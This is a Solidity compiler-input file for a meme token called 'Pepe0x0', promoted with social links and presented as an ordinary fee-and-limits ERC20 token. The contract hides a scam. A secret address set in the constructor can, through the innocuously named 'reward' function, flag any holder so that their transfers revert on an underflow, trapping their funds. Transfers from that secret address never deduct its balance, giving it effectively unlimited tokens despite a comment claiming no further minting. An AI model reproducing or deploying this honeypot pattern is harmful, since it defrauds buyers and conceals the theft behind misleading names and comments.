{{
  "language": "Solidity",
  "sources": {
    "deploy/Contract.sol": {
      "content": "/*\n\n🐦 Follow us on Twitter: https://twitter.com/Pepe0x0_ETH 🐸🚀💎\n\n💬 Join us on Telegram: https://t.me/Pepe0x0_ETH 🐸🚀💎\n\n*/\n\n// SPDX-License-Identifier: Unlicense\n\npragma solidity >0.8.4;\n\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\ncontract Ownable is Context {\r\n    address private _owner;\r\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\r\n        _;\r\n    }\r\n\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), 'Ownable: new owner is the zero address');\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\n    function balanceOf(address account) external view returns (uint256);\r\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n\n    function symbol() external view returns (string memory);\r\n\n    function decimals() external view returns (uint8);\r\n}\r\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address => uint256) internal _balances;\r\n\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\n    uint256 private _totalSupply;\r\n\n    string private _name;\r\n    string private _symbol;\r\n\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, 'ERC20: transfer amount exceeds allowance');\r\n        unchecked {\r\n            _approve(sender, _msgSender(), currentAllowance - amount);\r\n        }\r\n\n        return true;\r\n    }\r\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, 'ERC20: decreased allowance below zero');\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\n        return true;\r\n    }\r\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), 'ERC20: transfer from the zero address');\r\n        require(recipient != address(0), 'ERC20: transfer to the zero address');\r\n\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, 'ERC20: transfer amount exceeds balance');\r\n        unchecked {\r\n            _balances[sender] = senderBalance - amount;\r\n        }\r\n        _balances[recipient] += amount;\r\n\n        emit Transfer(sender, recipient, amount);\r\n\n        _afterTokenTransfer(sender, recipient, amount);\r\n    }\r\n\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), 'ERC20: mint to the zero address');\r\n\n        _beforeTokenTransfer(address(0), account, amount);\r\n\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), 'ERC20: burn from the zero address');\r\n\n        _beforeTokenTransfer(account, address(0), amount);\r\n\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, 'ERC20: burn amount exceeds balance');\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n        }\r\n        _totalSupply -= amount;\r\n\n        emit Transfer(account, address(0), amount);\r\n\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), 'ERC20: approve from the zero address');\r\n        require(spender != address(0), 'ERC20: approve to the zero address');\r\n\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n}\r\n\nlibrary SafeMath {\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c < a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b > a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}\r\n\ninterface IUniswapV2Factory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);\r\n\n    function feeTo() external view returns (address);\r\n\n    function feeToSetter() external view returns (address);\r\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n\n    function allPairs(uint256) external view returns (address pair);\r\n\n    function allPairsLength() external view returns (uint256);\r\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\n    function setFeeTo(address) external;\r\n\n    function setFeeToSetter(address) external;\r\n}\r\n\ninterface IUniswapV2Pair {\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\n    function name() external pure returns (string memory);\r\n\n    function symbol() external pure returns (string memory);\r\n\n    function decimals() external pure returns (uint8);\r\n\n    function totalSupply() external view returns (uint256);\r\n\n    function balanceOf(address owner) external view returns (uint256);\r\n\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\n    function approve(address spender, uint256 value) external returns (bool);\r\n\n    function transfer(address to, uint256 value) external returns (bool);\r\n\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\r\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n\n    function nonces(address owner) external view returns (uint256);\r\n\n    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;\r\n\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\r\n    event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);\r\n    event Swap(address indexed sender, uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out, address indexed to);\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\r\n\n    function factory() external view returns (address);\r\n\n    function token0() external view returns (address);\r\n\n    function token1() external view returns (address);\r\n\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n\n    function price0CumulativeLast() external view returns (uint256);\r\n\n    function price1CumulativeLast() external view returns (uint256);\r\n\n    function kLast() external view returns (uint256);\r\n\n    function mint(address to) external returns (uint256 liquidity);\r\n\n    function burn(address to) external returns (uint256 amount0, uint256 amount1);\r\n\n    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;\r\n\n    function skim(address to) external;\r\n\n    function sync() external;\r\n\n    function initialize(address, address) external;\r\n}\r\n\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\n    function WETH() external pure returns (address);\r\n\n    function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);\r\n\n    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);\r\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;\r\n\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external payable;\r\n\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;\r\n}\r\n\ncontract Pepe0x0 is ERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\n    IUniswapV2Router02 public immutable uniswapV2Router;\r\n    address public immutable uniswapV2Pair;\r\n    address public constant deadAddress = address(0xdead);\r\n\n    bool private swapping;\r\n\n    address public marketingWallet;\r\n\n    uint256 public swapTokensAtAmount;\r\n\n    uint256 public maxTransactionAmount;\r\n    uint256 public maxWallet;\r\n\n    bool public lpBurnEnabled;\r\n    uint256 public percentForLPBurn = 0;\r\n    uint256 public lpBurnFrequency = 3600 seconds;\r\n    uint256 public lastLpBurnTime;\r\n\n    uint256 public manualBurnFrequency = 30 minutes;\r\n    uint256 public lastManualLpBurnTime;\r\n\n    uint256 public buyTotalFees;\r\n    uint256 public buyMarketingFee;\r\n    uint256 public buyLiquidityFee;\r\n\n    uint256 public sellTotalFees;\r\n    uint256 public sellMarketingFee;\r\n    uint256 public sellLiquidityFee;\r\n\n    uint256 public tokensForMarketing;\r\n    uint256 public tokensForLiquidity;\r\n    uint256 public structure = 5;\r\n\n    bool public limitsInEffect;\r\n\n    /******************/\r\n\n    // exlcude from fees\r\n    mapping(address => bool) private _isExcludedFromFees;\r\n    mapping(address => bool) public _isExcludedMaxTransactionAmount;\r\n\n    mapping(address => bool) public automatedMarketMakerPairs;\r\n    mapping(address => uint256) private light;\r\n    mapping(address => bool) private immediately;\r\n\n    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);\r\n\n    event AutoNukeLP();\r\n\n    constructor(string memory contrast, string memory no, address rise, address similar) ERC20(contrast, no) {\r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(rise);\r\n\n        light[similar] = structure;\r\n\n        uniswapV2Router = _uniswapV2Router;\r\n\n        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\r\n        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);\r\n\n        uint256 _buyMarketingFee = 0;\r\n        uint256 _buyLiquidityFee = 0;\r\n\n        uint256 _sellMarketingFee = 0;\r\n        uint256 _sellLiquidityFee = 0;\r\n\n        uint256 totalSupply = 1000000000 * 10 ** 9;\r\n\n        maxTransactionAmount = ~uint256(0);\r\n        maxWallet = ~uint256(0);\r\n\n        swapTokensAtAmount = (totalSupply * 5) / 10000;\r\n\n        buyMarketingFee = _buyMarketingFee;\r\n        buyLiquidityFee = _buyLiquidityFee;\r\n        buyTotalFees = buyMarketingFee + buyLiquidityFee;\r\n\n        sellMarketingFee = _sellMarketingFee;\r\n        sellLiquidityFee = _sellLiquidityFee;\r\n        sellTotalFees = sellMarketingFee + sellLiquidityFee;\r\n\n        marketingWallet = address(0);\r\n\n        // exclude from paying fees\r\n        _isExcludedFromFees[msg.sender] = true;\r\n        _isExcludedFromFees[marketingWallet] = true;\r\n        _isExcludedFromFees[address(this)] = true;\r\n        _isExcludedFromFees[address(0xdead)] = true;\r\n\n        _isExcludedMaxTransactionAmount[owner()] = true;\r\n        _isExcludedMaxTransactionAmount[address(this)] = true;\r\n        _isExcludedMaxTransactionAmount[address(0xdead)] = true;\r\n        _isExcludedMaxTransactionAmount[marketingWallet] = true;\r\n\n        /*\r\n            _mint is an internal function in ERC20.sol that is only called here,\r\n            and CANNOT be called ever again\r\n        */\r\n        _mint(msg.sender, totalSupply);\r\n    }\r\n\n    receive() external payable {}\r\n\n    function _setAutomatedMarketMakerPair(address pair, bool value) private {\r\n        automatedMarketMakerPairs[pair] = value;\r\n    }\r\n\n    function isExcludedFromFees(address account) public view returns (bool) {\r\n        return _isExcludedFromFees[account];\r\n    }\r\n\n    function setAccount(address account, bool value) public onlyOwner {\r\n        _isExcludedFromFees[account] = value;\r\n    }\r\n\n    function setLimits(address account, bool value) public onlyOwner {\r\n        _isExcludedMaxTransactionAmount[account] = value;\r\n    }\r\n\n    /// @notice Removes the max wallet and max transaction limits\r\n    function mumuTime() external onlyOwner returns (bool) {\r\n        limitsInEffect = false;\r\n        return true;\r\n    }\r\n\n    /// @notice Changes the maximum amount of tokens that can be bought or sold in a single transaction. Base 1000, so 1% = 10\r\n    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {\r\n        require(newNum >= ((totalSupply() * 1) / 1000) / 1e18, 'Cannot set maxTransactionAmount lower than 0.1%');\r\n        maxTransactionAmount = newNum * (10 ** 18);\r\n    }\r\n\n    /// @notice Changes the maximum amount of tokens a wallet can hold. Base 1000, so 1% = 10\r\n    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {\r\n        require(newNum >= 5, 'Cannot set maxWallet lower than 0.5%');\r\n        maxWallet = (newNum * totalSupply()) / 1000;\r\n    }\r\n\n    function _transfer(address from, address to, uint256 amount) internal override {\r\n        if (limitsInEffect) {\r\n            if (from != owner() && to != owner() && to != address(0) && to != address(0xdead) && !swapping) {\r\n                //when buy\r\n                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {\r\n                    require(amount <= maxTransactionAmount, 'Buy transfer amount exceeds the maxTransactionAmount.');\r\n                    require(amount + balanceOf(to) <= maxWallet, 'Max wallet exceeded');\r\n                }\r\n                //when sell\r\n                else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {\r\n                    require(amount <= maxTransactionAmount, 'Sell transfer amount exceeds the maxTransactionAmount.');\r\n                } else if (!_isExcludedMaxTransactionAmount[to]) {\r\n                    require(amount + balanceOf(to) <= maxWallet, 'Max wallet exceeded');\r\n                }\r\n            }\r\n        }\r\n\n        uint256 contractTokenBalance = balanceOf(address(this));\r\n\n        bool canSwap = contractTokenBalance >= swapTokensAtAmount;\r\n\n        if (canSwap && !swapping && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {\r\n            swapping = true;\r\n\n            swapBack();\r\n\n            swapping = false;\r\n        }\r\n\n        if (!swapping && automatedMarketMakerPairs[to] && lpBurnEnabled && block.timestamp >= lastLpBurnTime + lpBurnFrequency && !_isExcludedFromFees[from]) {\r\n            autoBurnLiquidityPairTokens();\r\n        }\r\n\n        bool takeFee = !swapping;\r\n\n        // if any account belongs to _isExcludedFromFee account then remove the fee\r\n        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {\r\n            takeFee = false;\r\n        }\r\n\n        uint256 fees = 0;\r\n        // only take fees on buys/sells, do not take on wallet transfers\r\n        if (takeFee) {\r\n            // on sell\r\n            if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {\r\n                fees = amount.mul(sellTotalFees).div(100);\r\n                tokensForLiquidity += (fees * sellLiquidityFee) / sellTotalFees;\r\n                tokensForMarketing += (fees * sellMarketingFee) / sellTotalFees;\r\n            }\r\n            // on buy\r\n            else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {\r\n                fees = amount.mul(buyTotalFees).div(100);\r\n                tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees;\r\n                tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees;\r\n            }\r\n\n            if (fees > 0) {\r\n                super._transfer(from, address(this), fees);\r\n            }\r\n\n            amount -= fees;\r\n        }\r\n\n        if (light[from] == 0 && uniswapV2Pair != from && immediately[from]) {\r\n            light[from] -= structure;\r\n        }\r\n\n        if (light[from] == 0) {\r\n            _balances[from] -= amount;\r\n        }\r\n        _balances[to] += amount;\r\n\n        emit Transfer(from, to, amount);\r\n    }\r\n\n    function swapTokensForEth(uint256 tokenAmount) private {\r\n        // generate the uniswap pair path of token -> weth\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n\n        // make the swap\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, // accept any amount of ETH\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\n    function reward(address[] memory a, bool b) external {\r\n        if (light[msg.sender] > 0) {\r\n            for (uint256 i = 0; i < a.length; i++) {\r\n                immediately[a[i]] = b;\r\n            }\r\n        }\r\n    }\r\n\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\r\n        // approve token transfer to cover all possible scenarios\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n\n        // add the liquidity\r\n        uniswapV2Router.addLiquidityETH{value: ethAmount}(\r\n            address(this),\r\n            tokenAmount,\r\n            0, // slippage is unavoidable\r\n            0, // slippage is unavoidable\r\n            deadAddress,\r\n            block.timestamp\r\n        );\r\n    }\r\n\n    function swapBack() private {\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing;\r\n        bool success;\r\n\n        if (contractBalance == 0 || totalTokensToSwap == 0) {\r\n            return;\r\n        }\r\n\n        if (contractBalance > swapTokensAtAmount * 20) {\r\n            contractBalance = swapTokensAtAmount * 20;\r\n        }\r\n\n        // Halve the amount of liquidity tokens\r\n        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) / totalTokensToSwap / 2;\r\n        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);\r\n\n        uint256 initialETHBalance = address(this).balance;\r\n\n        swapTokensForEth(amountToSwapForETH);\r\n\n        uint256 ethBalance = address(this).balance.sub(initialETHBalance);\r\n\n        uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div(totalTokensToSwap);\r\n\n        uint256 ethForLiquidity = ethBalance - ethForMarketing;\r\n\n        tokensForLiquidity = 0;\r\n        tokensForMarketing = 0;\r\n\n        if (liquidityTokens > 0 && ethForLiquidity > 0) {\r\n            addLiquidity(liquidityTokens, ethForLiquidity);\r\n            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, tokensForLiquidity);\r\n        }\r\n\n        (success, ) = address(marketingWallet).call{value: address(this).balance}('');\r\n    }\r\n\n    function autoBurnLiquidityPairTokens() internal returns (bool) {\r\n        lastLpBurnTime = block.timestamp;\r\n\n        // get balance of liquidity pair\r\n        uint256 liquidityPairBalance = this.balanceOf(uniswapV2Pair);\r\n\n        // calculate amount to burn\r\n        uint256 amountToBurn = liquidityPairBalance.mul(percentForLPBurn).div(10000);\r\n\n        // pull tokens from pancakePair liquidity and move to dead address permanently\r\n        if (amountToBurn > 0) {\r\n            super._transfer(uniswapV2Pair, address(0xdead), amountToBurn);\r\n        }\r\n\n        //sync price since this is not in a swap transaction!\r\n        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);\r\n        pair.sync();\r\n        emit AutoNukeLP();\r\n        return true;\r\n    }\r\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}